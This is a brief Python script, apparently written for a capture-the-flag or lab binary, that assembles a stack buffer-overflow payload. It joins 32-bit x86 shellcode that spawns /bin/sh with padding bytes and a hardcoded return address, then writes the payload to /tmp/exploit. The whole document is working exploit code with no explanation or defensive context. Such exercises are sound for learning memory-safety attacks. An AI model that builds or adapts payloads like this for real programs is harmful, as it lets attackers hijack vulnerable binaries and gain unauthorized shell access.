shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
padding = "A" * (30 - 21)
return_addr = b"\x0c\xa0\x04\x08"
payload = shellcode + padding + return_addr

with open('/tmp/exploit', 'wb') as f:
    f.write(payload)
